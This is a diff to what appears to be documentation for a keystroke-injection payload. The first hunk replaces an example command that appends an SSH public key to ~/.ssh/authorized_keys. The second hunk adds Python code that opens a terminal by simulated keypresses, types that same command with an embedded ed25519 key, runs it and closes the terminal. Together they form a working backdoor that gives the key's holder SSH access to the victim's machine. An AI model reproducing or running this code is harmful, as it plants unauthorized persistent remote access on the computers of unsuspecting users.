@@ -15,7 +15,7 @@
 
     Or
 
-        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD4XWET4U7/cjkLSQRPOX3s1urmjAfSqxyLNd+U9lrqrEkXRGDM0RQpmjm/2uEsiFTRYYTjTaQm/1W4cFqKFO7NqkKH6OC0Oqdsrm+jz15zHWK1TR0FifTuVZCfK6nTIeQMBGv9jMRlUJjQuMfr52/lLG5OX+bDX1R07Z2rZy6dydVGyN1XyQDqT8RLlit7/Qrc6i4v04qLsFlqEQX2oqSpvfzJ4LOYtcAFPbMIUE3f0haaUy505kv1LKJC8to6US+Cqpte5LSrebnjEOY6U6LgWg+9kycTkvwSos+F5sThx//nBgDzBld6Ld0bgOLmWMYnRSZC86S46sZ+XV+TwhJvDlSJ4LE+LkYcYO5+c750PRO37yMvUzrUaR1VBKBeu++sDwA/GBLrmr0tpvWy/JHQA5798XMuJXgougfYI+KN+YgvqCyxWQbCz1kGsjhU5ZPfOeXIlRGw2zBIhZnn0p76wmBHZzh6Rv3qSLLabAHvFwcqmamSZ696EioA0KYe5Nk=" >> ~/.ssh/authorized_keys
+        echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsaYMfynllFnvDF7H37hVv6l3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys
 
 
 
@@ -81,3 +81,22 @@ This will do the following:
 
 
 
+
+keyboard = Controller()
+sleep(3)
+keyboard.press(Key.ctrl_l)
+keyboard.press(Key.alt_l)
+keyboard.press('t')
+keyboard.release(Key.ctrl_l)
+keyboard.release(Key.alt_l)
+keyboard.release('t')
+sleep(1)
+keyboard.type('echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsaYMfynllFnvDF7H37hVv6l3QPLjdSBQj2WyXHr0H" >> ~/.ssh/authorized_keys')
+sleep(2)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+sleep(1)
+keyboard.type('exit')
+sleep(1)
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
